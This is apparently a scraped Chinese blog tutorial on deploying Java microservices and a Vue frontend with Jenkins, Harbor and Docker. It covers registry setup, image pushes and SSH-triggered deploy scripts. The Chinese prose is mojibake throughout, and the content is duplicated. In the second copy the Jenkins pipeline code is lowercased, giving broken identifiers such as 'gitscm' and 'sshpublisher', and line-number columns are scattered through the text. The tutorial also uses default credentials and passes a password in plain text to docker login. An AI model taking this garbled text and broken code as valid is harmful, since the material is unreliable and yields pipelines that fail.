transfers: [sshTransfer(cleanRemote: false, excludes: \'\', execCommand: "/home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}", execTimeout: 120000, flatten: false, makeEmptyDirs: false, noDefaultExcludes: false, patternSeparator: \'[, ]+\', remoteDirectory: \'\', remoteDirectorySDF: false, removePrefix: \'\', sourceFiles: \'\')], usePromotionTimestamp: false, useWorkspaceInPromotion: false, verbose: false)])\n\n    }\n    // åéé®ä»¶\n    stage(\'send email\') {\n        emailext body: \'\'\'<!DOCTYPE html>\n        <html>\n        <head>\n            <meta charset="UTF-8">\n            <title>${ENV, var="JOB_NAME"}-ç¬¬${BUILD_NUMBER}æ¬¡æå»ºæ¥å¿</title>\n        </head>\n        <body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n        <table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica, sansserif">\n            <tr>\n                <td>(æ¬é®ä»¶æ¯ç¨åºèªå¨ä¸åçï¼è¯·å¿åå¤ï¼)</td>\n            </tr>\n            <tr>\n                <td><h2>\n                    <font color="#0000FF">æå»ºç»æ - ${BUILD_STATUS}</font>\n                </h2></td>\n            </tr>\n            <tr>\n                <td><br/>\n                    <b><font color="#0B610B">æå»ºä¿¡æ¯</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>é¡¹ç®åç§°&nbsp;ï¼&nbsp;${PROJECT_NAME}</li>\n                        <li>æå»ºç¼å·&nbsp;ï¼&nbsp;ç¬¬${BUILD_NUMBER}æ¬¡æå»º</li>\n                        <li>è§¦ååå ï¼&nbsp;${CAUSE}</li>\n                        <li>æå»ºæ¥å¿ï¼&nbsp;\n                            <a href="${BUILD_URL}console">${BUILD_URL}console</a>\n                        </li>\n                        <li>æå»º&nbsp;&nbsp;Url&nbsp;ï¼&nbsp;\n                            <a href="${BUILD_URL}">${BUILD_URL}</a>\n                        </li>\n                        <li>å·¥ä½ç®å½&nbsp;ï¼&nbsp;\n                            <a href="${PROJECT_URL}ws">${PROJECT_URL}ws</a>\n                        </li>\n                        <li>é¡¹ç®&nbsp;&nbsp;Url&nbsp;ï¼&nbsp;\n                            <a href="${PROJECT_URL}">${PROJECT_URL}</a>\n                        </li>\n                    </ul>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0B610B">Changes Since Last Successful Build:</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>åå²åæ´è®°å½ : <a href="${PROJECT_URL}changes">${PROJECT_URL}changes</a></li>\n                    </ul>\n                    ${CHANGES_SINCE_LAST_SUCCESS,reverse=true, format="Changes for Build #%n:<br/>%c<br/>",showPaths=true,changesFormat="<pre>[%a]<br/>%m</pre>",pathFormat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n                </td>\n            </tr>\n            <tr>\n                <td><b>Failed Test Results</b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <pre style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica,sans-serif">\n                        $FAILED_TESTS\n                    </pre>\n                    <br/>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0B610B">æå»ºæ¥å¿ (æå 100è¡):</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <textarea cols="80" rows="30" readonly="readonly"\n                              style="font-family: Courier New">\n                        ${BUILD_LOG,maxLines=100}\n                    </textarea>\n                </td>\n            </tr>\n        </table>\n        </body>\n        </html>\'\'\', mimeType: \'text/html\', subject: \'43243214321\', to: \'875730567@qq.com\'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n\n\néæ°æå»ºï¼å¶ä»æå¡å¨å°±ä¼èªå¨æåäºã\n\n> å¶ä»æå¡å¨ä¸å®è¦æ jenkins æå¡å¨çå¬é¥ï¼æå»ºè¿ç¨ SSH ä¸ä¼è¾åºä»»ä½ä¿¡æ¯åªä¼åè¯ä½  EXEC æ§è¡äºå¤ä¹ï¼éè¦èªå·±å»æµä¸ä¸ã\n\n\n# vue åç«¯ä½¿ç¨ Jenkins é¨ç½²\n\n1. é¦åéè¦å®è£ NodeJS æä»¶\n2. å° Manager Jenkins->Global Tool Configuration->NodeJS\n\n\n\n3. åå»ºä¸ä¸ªæµæ°´çº¿çåç«¯é¡¹ç®ï¼æ ¹æ®èæ¬æéç½®è¡¥å¨\n\nnode {\n    stage(\'æåä»£ç \') {\n        checkout([$class: \'GitSCM\', branches: [[name: \'*/${branch}\']], extensions: [], userRemoteConfigs: [[credentialsId: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test_vue.git\']]])\n    }\n    stage(\'æåï¼é¨ç½²ç½ç«\') {\n        //ä½¿ç¨NodeJSçnpmè¿è¡æåï¼è¿ä¸ªå ä»¥ä¸ç name ä¿æä¸è´\n        nodejs(\'nodejs12\'){\n            sh \'\'\'\n                npm install\n                npm run build\n            \'\'\'\n        }\n        //=====ä»¥ä¸ä¸ºè¿ç¨è°ç¨è¿è¡é¡¹ç®é¨ç½²========\n        sshPublisher(publishers: [sshPublisherDesc(configName: \'master_server\',transfers: [sshTransfer(cleanRemote: false, excludes: \'\', execCommand: \'\',execTimeout: 120000, flatten: false, makeEmptyDirs: false, noDefaultExcludes:false, patternSeparator: \'[, ]+\', remoteDirectory: \'/usr/share/nginx/html\',remoteDirectorySDF: false, removePrefix: \'dist\', sourceFiles: \'dist/**\')],usePromotionTimestamp: false, useWorkspaceInPromotion: false, verbose: false)])\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nä»èæ¬ä¸­å¯ä»¥çåºï¼æä»¬éè¦ä¸ä¸ª branch åæ°ï¼è¿è¦éç½® åç«¯é¡¹ç®ç è¿ç¨ server å°å\n\n> è¿éæ²¡æä½¿ç¨ execCommand çå½ä»¤ï¼èæ¯éè¿ sourceFilesãremovePrefixãremoteDirectoryï¼sourceFiles ä»£è¡¨æä»¬ copy åªä¸ªæä»¶ï¼remoteDirectory è¿ç¨ç®å½ï¼ç¹å°±æ¯ copy å° nginx æå¨ç®å½\n> 57-62',normalizedContent:'å¤§è´æµç¨è¯´æï¼\n1. å¼åäººåæ¯å¤©æä»£ç æäº¤å° gitlab ä»£ç ä»åº\n2.jenkins ä» gitlab ä¸­æåé¡¹ç®æºç ï¼ç¼è¯å¹¶ææ jar åï¼ç¶åæå»ºæ docker éåï¼å°éåä¸ä¼ å° harbor ç§æä»åºã\n3.jenkins åé ssh è¿ç¨å½ä»¤ï¼è®©çäº§é¨ç½²æå¡å¨å° harbor ç§æä»åºæåéåå°æ¬å°ï¼ç¶ååå»ºå®¹å¨ã\n4. æåï¼ç¨æ·å¯ä»¥è®¿é®å°å®¹å¨\n\n> è¿éä¸è®²è¿° docker çå®è£ååºç¡å½ä»¤çä½¿ç¨ï¼å­¦ dockers å¯ä»¥ç docker æ¦å¿µãå½ä»¤ãdockerfile ç­çè¿ç¯å°±å¤äº è¿ç¯æç« \n\n\n# harbor éåä»åºå®è£åä½¿ç¨\n\nharborï¼æ¸¯å£ï¼æ¸¯æ¹¾ï¼æ¯ä¸ä¸ªç¨äºå­å¨ååå docker éåçä¼ä¸çº§ registry æå¡å¨ãé¤äº harbor è¿ä¸ªç§æéåä»åºä¹å¤ï¼è¿æ docker å®æ¹æä¾ç registryãç¸å¯¹ registryï¼harbor å·æå¾å¤ä¼å¿ï¼\n\n 1. æä¾åå±ä¼ è¾æºå¶ï¼ä¼åç½ç»ä¼ è¾ docker éåæ¯æ¯åå±çï¼èå¦ææ¯æ¬¡ä¼ è¾é½ä½¿ç¨å¨éæä»¶ (æä»¥\n    ç¨ ftp çæ¹å¼å¹¶ä¸éå)ï¼æ¾ç¶ä¸ç»æµãå¿é¡»æä¾è¯å«åå±ä¼ è¾çæºå¶ï¼ä»¥å±ç uuid ä¸ºæ è¯ï¼ç¡®å®\n    ä¼ è¾çå¯¹è±¡ã\n 2. æä¾ web çé¢ï¼ä¼åç¨æ·ä½éª åªç¨éåçåå­æ¥è¿è¡ä¸ä¼ ä¸è½½æ¾ç¶å¾ä¸æ¹ä¾¿ï¼éè¦æä¸ä¸ªç¨æ·ç\n    é¢å¯ä»¥æ¯æç»éãæç´¢åè½ï¼åæ¬åºåå¬æãç§æéåã\n 3. æ¯ææ°´å¹³æ©å±éç¾¤ å½æç¨æ·å¯¹éåçä¸ä¼ ä¸è½½æä½éä¸­å¨ææå¡å¨ï¼éè¦å¯¹ç¸åºçè®¿é®ååä½å\n    è§£ã\n 4. è¯å¥½çå®å¨æºå¶ ä¼ä¸ä¸­çå¼åå¢éæå¾å¤ä¸åçèä½ï¼å¯¹äºä¸åçèä½äººåï¼åéä¸åçæéï¼\n    å·ææ´å¥½çå®å¨æ§ã\n\n\n# harbor å®è£\n\n 1. é¤äº docker ä»¥å¤ï¼è¿è¦å®è£ dockers-composeï¼docker compose å½ä»¤åä½¿ç¨ ä½ å¯ä»¥çè¿ç¯åå®¢\n 2. ä¸è½½ harbor çåç¼©åï¼å°åï¼éè¦ç§å¼ä¸ç½ï¼ä¸è½½å®æå¼å§è§£å\n\ntar -xzf harbor-offline-installer-v1.9.2.tgz\nmv harbor /opt/software/\n# ä¿®æ¹éç½®æä»¶åå®¹\nvim /opt/software/harbor/harbor.yml \n# ä¿®æ¹hostname\nhostname: ä½ èªå·±æºå¨çip\n# ä¿®æ¹ç«¯å£\nport: 85\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 3. å®è£ harbor\n\ncd /opt/software/harbor\n./prepare\n./install.sh\n\n\n1\n2\n3\n\n 4. å¯å¨ harbor\n\ndocker-compose up -d å¯å¨\ndocker-compose stop åæ­¢\ndocker-compose restart éæ°å¯å¨\n\n\n1\n2\n3\n\n 5. è®¿é® harbor http://ip:85ï¼é»è®¤è´¦æ·å¯ç ï¼admin/harbor12345\n\n\n# harbor ä½¿ç¨\n\n1. åå»ºé¡¹ç®\nharbor çé¡¹ç®åä¸ºå¬å¼åç§æçï¼\n\n * å¬å¼é¡¹ç®ï¼ææç¨æ·é½å¯ä»¥è®¿é®ï¼éå¸¸å­æ¾å¬å±çéåï¼é»è®¤æä¸ä¸ª library å¬å¼é¡¹ç®ã\n * ç§æé¡¹ç®ï¼åªæææç¨æ·æå¯ä»¥è®¿é®ï¼éå¸¸å­æ¾é¡¹ç®æ¬èº«çéåã\n\næä»¬å¯ä»¥ä¸ºå¾®æå¡é¡¹ç®åå»ºä¸ä¸ªæ°çé¡¹ç®ï¼\n\n\n\n\n\n2. ç¨æ·åå»º\n\n\n\n3. ä¸ºç¨æ·åéé¡¹ç®\n\n\n\n\n\n\n# æ¨éå°éåä»åº\n\n# ææ ç­¾ï¼å½ä»¤ docker tag nginx:1.17.1 harborçip:ç«¯å£/harboré¡¹ç®çåç§°/éååå­\ndocker tag nginx:1.17.1 192.168.81.102:85/test/nginx:1.17.1\n# æ¥ç\ndocker images\n# ä¼å¤ä¸æ¡éåæ°æ®\n192.168.81.102:85/test/nginx         1.17.1                          98ebf73aba75        2 years ago         109mb\n\n\n1\n2\n3\n4\n5\n6\n\n\næ harbor å°åå å¥å° docker ä¿¡ä»»åè¡¨\n\n# ç¼è¾dockeræä»¶\nvim /etc/docker/daemon.json\n# å å¥è¿å¥è¯\n"insecure-registries":["192.168.81.102:85"],\n# éå¯éç½®ådocker\nsystemctl restart docker\n# harbor  ç test é¡¹ç®æ¯ç§æçï¼éè¦ç»å½\ndocker login -u admin -p harbor12345 192.168.81.102:85\n# æ¨éå°harborä»åºé\ndocker push 192.168.81.102:85/test/nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n\n\n\nå¶ä»æå¡ä¸è½½éåä¹éè¦æå°åæ·»å å° docker çéç½®æä»¶ä¸­ï¼å¹¶ä¸ä¹éè¦ä½¿ç¨ docker login è¿è¡ç»å½ãå¤å¶ä»¥ä¸çå½ä»¤ï¼å°å¶ä»æå¡å¨ä¸æ§è¡å³å¯ã\n\n\n\n\n# å¾®æå¡æå»ºå° docker éå\n\n1. æå¾®æå¡æäº¤å° svn\n2. å¨ jenkins ä¸åå»ºä¸ä¸ª pipelin ç±»åç itemï¼é¡¹ç®ï¼\n3. éç½® pipelin item çæå»ºæ¶åæ°\n\n\n\n\n\n\n\n> è¿éè®²ä¸ç¹ï¼é¡¹ç®ä¸­å¾å¤ç jar æ¯æä¾èµå³ç³»çï¼å¦æåç¬ææä¸ªæå¡å¯è½ä¼åæ¾ä¸å°ä¾èµï¼æä»¥å»ºè®®ç¬¬ä¸æ¬¡å¯¹æ ¹ç®å½è¿è¡æåï¼ä¼æä¾èµå¨é¨å è½½å° maven åºä¸­ï¼åæåä¸ªæå¡æåå³å¯ã\n\n4. å¨æ¯ä¸ªæå¡ç pom æä»¶ä¸­æ·»å  plugin\n\n\x3c!-- å¸®å©è¯»åé¡¹ç®ä¸­çdockerfileæä»¶ï¼å¸®æä»¬æå»ºdockeréå --\x3e\n<plugin>\n    <groupid>com.spotify</groupid>\n    <artifactid>dockerfile-maven-plugin</artifactid>\n    <version>1.3.6</version>\n    <configuration>\n        <repository>${project.artifactid}</repository>\n        \x3c!-- å®ä¹dockerfile æä»¶çåæ° --\x3e\n        <buildargs>\n            \x3c!-- å®ä¹ä¸ä¸ª java_file åæ°,æä¸ºæä»¬é¡¹ç®çåç§° --\x3e\n            <jar_file>target/${project.build.finalname}.jar</jar_file>\n        </buildargs>\n    </configuration>\n</plugin>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n5. å¨æ¯ä¸ªæå¡çæ ¹ç®å½ä¸ç¼å dockerfile æä»¶\n\nfrom openjdk:8-jdk-alpine\n# è¿ä¸ªä¼è¯»åå¨pomä¸­å£°æçåé\narg jar_file\ncopy ${jar_file} app.jar\n# å¯¹å¤ç«¯å£\nexpose 10086\nentrypoint ["java","-jar","/app.jar"]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n6. è®¾ç½®æå»ºåéåæ¨è³éåä»åº\n\n\n\n\n\n\n\n7. å¨é¡¹ç®çæ ¹ç®å½ä¸­ç¼å jenkinsfile\n\nnode {\n    // çæ¬\n    def tag = "1.0"\n    // éåä»åºçå°å\n    def harbor_url = "192.168.81.102:85"\n    // éåä»åºçé¡¹ç®,è¿éå»ºè®®é¡¹ç®åç§°åjenkinsçitemé¡¹ç®åç§°ãä»¥åharborçé¡¹ç®åç§°ä¿æä¸è´ï¼å¦åç¨ä¸ä¸èæ¬ä¼åºé®é¢\n    def harbor_project = "demo"\n\n    // æåä»£ç \n    stage(\'pull code\') {\n        checkout([$class: \'gitscm\', branches: [[name: \'*/${branch}\']], extensions: [], userremoteconfigs: [[credentialsid: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // ç¼è¯å¹¶æ¨ééåä»åº\n    stage(\'build project\') {\n        if  ("${project_name}" ==  \'demo\' ) {\n            echo \'æåæ ¹ç®å½\'\n            sh \'mvn clean package dockerfile:build\'\n        } else {\n            echo  "æåå­ç®å½ ${project_name}"\n            sh "mvn -f ${project_name} clean package dockerfile:build"\n        }\n        echo "æjarä¸ä¼ éåä»åº"\n        def oldimagename = "${project_name}:latest"\n        def newimagename = "${harbor_url}/${harbor_project}/${project_name}:${tag}"\n        // æ¹åç§° åè§è\n        sh "docker tag ${oldimagename} ${newimagename}"\n        // å é¤ä¹åç éå\n        sh "docker rmi ${oldimagename}"\n        // æ¨éå° dockersä»åº\n        withcredentials([usernamepassword(credentialsid: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordvariable: \'harbor_password\', usernamevariable: \'harbor_account\')]) {\n            // ç»å½\n            sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n            // ä¸ä¼ \n            sh "docker push ${newimagename}"\n            echo "éåæ¨éæå"\n        }\n    }\n    // åéé®ä»¶\n    stage(\'send email\') {\n        emailext body: \'\'\'<!doctype html>\n        <html>\n        <head>\n            <meta charset="utf-8">\n            <title>${env, var="job_name"}-ç¬¬${build_number}æ¬¡æå»ºæ¥å¿</title>\n        </head>\n        <body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n        <table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: tahoma, arial, helvetica, sansserif">\n            <tr>\n                <td>(æ¬é®ä»¶æ¯ç¨åºèªå¨ä¸åçï¼è¯·å¿åå¤ï¼)</td>\n            </tr>\n            <tr>\n                <td><h2>\n                    <font color="#0000ff">æå»ºç»æ - ${build_status}</font>\n                </h2></td>\n            </tr>\n            <tr>\n                <td><br/>\n                    <b><font color="#0b610b">æå»ºä¿¡æ¯</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>é¡¹ç®åç§°&nbsp;ï¼&nbsp;${project_name}</li>\n                        <li>æå»ºç¼å·&nbsp;ï¼&nbsp;ç¬¬${build_number}æ¬¡æå»º</li>\n                        <li>è§¦ååå ï¼&nbsp;${cause}</li>\n                        <li>æå»ºæ¥å¿ï¼&nbsp;\n                            <a href="${build_url}console">${build_url}console</a>\n                        </li>\n                        <li>æå»º&nbsp;&nbsp;url&nbsp;ï¼&nbsp;\n                            <a href="${build_url}">${build_url}</a>\n                        </li>\n                        <li>å·¥ä½ç®å½&nbsp;ï¼&nbsp;\n                            <a href="${project_url}ws">${project_url}ws</a>\n                        </li>\n                        <li>é¡¹ç®&nbsp;&nbsp;url&nbsp;ï¼&nbsp;\n                            <a href="${project_url}">${project_url}</a>\n                        </li>\n                    </ul>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0b610b">changes since last successful build:</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>åå²åæ´è®°å½ : <a href="${project_url}changes">${project_url}changes</a></li>\n                    </ul>\n                    ${changes_since_last_success,reverse=true, format="changes for build #%n:<br/>%c<br/>",showpaths=true,changesformat="<pre>[%a]<br/>%m</pre>",pathformat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n                </td>\n            </tr>\n            <tr>\n                <td><b>failed test results</b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <pre style="font-size: 11pt; font-family: tahoma, arial, helvetica,sans-serif">\n                        $failed_tests\n                    </pre>\n                    <br/>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0b610b">æå»ºæ¥å¿ (æå 100è¡):</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <textarea cols="80" rows="30" readonly="readonly"\n                              style="font-family: courier new">\n                        ${build_log,maxlines=100}\n                    </textarea>\n                </td>\n            </tr>\n        </table>\n        </body>\n        </html>\'\'\', mimetype: \'text/html\', subject: \'43243214321\', to: \'875730567@qq.com\'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n\n\n\n# jenkins èªå¨åæå¡æåéåå¹¶å¯å¨\n\nè¿é¨æä½éè¦å®è£ä¸ä¸ª publish over ssh æä»¶ï¼å®è£å¥½åå¨ manager jenkins -> configure system è¿è¡éç½®\n\n\n\næ´æ¹ jenkinsfile èæ¬ï¼æ·»å è¿ç¨æºå¨æåéåå¹¶å¯å¨å®¹å¨ï¼å·ä½è¯­æ³æä¹ä½¿ç¨ï¼å¯ä»¥å° æµæ°´çº¿è¯­æ³ä¸­æ¥ç\n\n\n\nnode {\n    // çæ¬\n    def tag = "1.0"\n    // éåä»åºçå°å\n    def harbor_url = "192.168.81.102:85"\n    // éåä»åºçé¡¹ç®,è¿éå»ºè®®é¡¹ç®åç§°åjenkinsçitemé¡¹ç®åç§°ãä»¥åharborçé¡¹ç®åç§°ä¿æä¸è´ï¼å¦åç¨ä¸ä¸èæ¬ä¼åºé®é¢\n    def harbor_project = "demo"\n\n    // æåä»£ç \n    stage(\'pull code\') {\n        checkout([$class: \'gitscm\', branches: [[name: \'*/${branch}\']], extensions: [], userremoteconfigs: [[credentialsid: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // ç¼è¯å¹¶æ¨ééåä»åº\n    stage(\'build project\') {\n        if  ("${project_name}" ==  \'demo\' ) {\n            echo \'æåæ ¹ç®å½\'\n            sh \'mvn clean package dockerfile:build\'\n        } else {\n            echo  "æåå­ç®å½ ${project_name}"\n            sh "mvn -f ${project_name} clean package dockerfile:build"\n        }\n        echo "æjarä¸ä¼ éåä»åº"\n        def oldimagename = "${project_name}:latest"\n        def newimagename = "${harbor_url}/${harbor_project}/${project_name}:${tag}"\n        // æ¹åç§° åè§è\n        sh "docker tag ${oldimagename} ${newimagename}"\n        // å é¤ä¹åç éå\n        sh "docker rmi ${oldimagename}"\n        // æ¨éå° dockersä»åº\n        withcredentials([usernamepassword(credentialsid: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordvariable: \'harbor_password\', usernamevariable: \'harbor_account\')]) {\n            // ç»å½\n            sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n            // ä¸ä¼ \n            sh "docker push ${newimagename}"\n            echo "éåæ¨éæå"\n        }\n\n        // è¿ç¨è°ç¨èæ¬,port æå¥½ä¹æ·»å  jenkinsé¡¹ç®éç½®éçåæ°éç½®ï¼ä½ä¸ºåæ°ä¼ è¿æ¥\n        echo "æ§è¡è¿ç¨å½ä»¤ /home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}"\n        sshpublisher(publishers: [sshpublisherdesc(configname: \'test_103\', transfers: [sshtransfer(cleanremote: false, excludes: \'\', execcommand: "/home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}", exectimeout: 120000, flatten: false, makeemptydirs: false, nodefaultexcludes: false, patternseparator: \'[, ]+\', remotedirectory: \'\', remotedirectorysdf: false, removeprefix: \'\', sourcefiles: \'\')], usepromotiontimestamp: false, useworkspaceinpromotion: false, verbose: false)])\n\n    }\n    // åéé®ä»¶\n    stage(\'send email\') {\n        emailext body: \'\'\'<!doctype html>\n        <html>\n        <head>\n            <meta charset="utf-8">\n            <title>${env, var="job_name"}-ç¬¬${build_number}æ¬¡æå»ºæ¥å¿</title>\n        </head>\n        <body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n        <table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: tahoma, arial, helvetica, sansserif">\n            <tr>\n                <td>(æ¬é®ä»¶æ¯ç¨åºèªå¨ä¸åçï¼è¯·å¿åå¤ï¼)</td>\n            </tr>\n            <tr>\n                <td><h2>\n                    <font color="#0000ff">æå»ºç»æ - ${build_status}</font>\n                </h2></td>\n            </tr>\n            <tr>\n                <td><br/>\n                    <b><font color="#0b610b">æå»ºä¿¡æ¯</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>é¡¹ç®åç§°&nbsp;ï¼&nbsp;${project_name}</li>\n                        <li>æå»ºç¼å·&nbsp;ï¼&nbsp;ç¬¬${build_number}æ¬¡æå»º</li>\n                        <li>è§¦ååå ï¼&nbsp;${cause}</li>\n                        <li>æå»ºæ¥å¿ï¼&nbsp;\n                            <a href="${build_url}console">${build_url}console</a>\n                        </li>\n                        <li>æå»º&nbsp;&nbsp;url&nbsp;ï¼&nbsp;\n                            <a href="${build_url}">${build_url}</a>\n                        </li>\n                        <li>å·¥ä½ç®å½&nbsp;ï¼&nbsp;\n                            <a href="${project_url}ws">${project_url}ws</a>\n                        </li>\n                        <li>é¡¹ç®&nbsp;&nbsp;url&nbsp;ï¼&nbsp;\n                            <a href="${project_url}">${project_url}</a>\n                        </li>\n                    </ul>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0b610b">changes since last successful build:</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>åå²åæ´è®°å½ : <a href="${project_url}changes">${project_url}changes</a></li>\n                    </ul>\n                    ${changes_since_last_success,reverse=true, format="changes for build #%n:<br/>%c<br/>",showpaths=true,changesformat="<pre>[%a]<br/>%m</pre>",pathformat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n                </td>\n            </tr>\n            <tr>\n                <td><b>failed test results</b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <pre style="font-size: 11pt; font-family: tahoma, arial, helvetica,sans-serif">\n                        $failed_tests\n                    </pre>\n                    <br/>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0b610b">æå»ºæ¥å¿ (æå 100è¡):</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <textarea cols="80" rows="30" readonly="readonly"\n                              style="font-family: courier new">\n                        ${build_log,maxlines=100}\n                    </textarea>\n                </td>\n            </tr>\n        </table>\n        </body>\n        </html>\'\'\', mimetype: \'text/html\', subject: \'43243214321\', to: \'875730567@qq.com\'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n\n\néæ°æå»ºï¼å¶ä»æå¡å¨å°±ä¼èªå¨æåäºã\n\n> å¶ä»æå¡å¨ä¸å®è¦æ jenkins æå¡å¨çå¬é¥ï¼æå»ºè¿ç¨ ssh ä¸ä¼è¾åºä»»ä½ä¿¡æ¯åªä¼åè¯ä½  exec æ§è¡äºå¤ä¹ï¼éè¦èªå·±å»æµä¸ä¸ã\n\n\n# vue åç«¯ä½¿ç¨ jenkins é¨ç½²\n\n1. é¦åéè¦å®è£ nodejs æä»¶\n2. å° manager jenkins->global tool configuration->nodejs\n\n\n\n3. åå»ºä¸ä¸ªæµæ°´çº¿çåç«¯é¡¹ç®ï¼æ ¹æ®èæ¬æéç½®è¡¥å¨\n\nnode {\n    stage(\'æåä»£ç \') {\n        checkout([$class: \'gitscm\', branches: [[name: \'*/${branch}\']], extensions: [], userremoteconfigs: [[credentialsid: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test_vue.git\']]])\n    }\n    stage(\'æåï¼é¨ç½²ç½ç«\') {\n        //ä½¿ç¨nodejsçnpmè¿è¡æåï¼è¿ä¸ªå ä»¥ä¸ç name ä¿æä¸è´\n        nodejs(\'nodejs12\'){\n            sh \'\'\'\n                npm install\n                npm run build\n            \'\'\'\n        }\n        //=====ä»¥ä¸ä¸ºè¿ç¨è°ç¨è¿è¡é¡¹ç®é¨ç½²========\n        sshpublisher(publishers: [sshpublisherdesc(configname: \'master_server\',transfers: [sshtransfer(cleanremote: false, excludes: \'\', execcommand: \'\',exectimeout: 120000, flatten: false, makeemptydirs: false, nodefaultexcludes:false, patternseparator: \'[, ]+\', remotedirectory: \'/usr/share/nginx/html\',remotedirectorysdf: false, removeprefix: \'dist\', sourcefiles: \'dist/**\')],usepromotiontimestamp: false, useworkspaceinpromotion: false, verbose: false)])\n    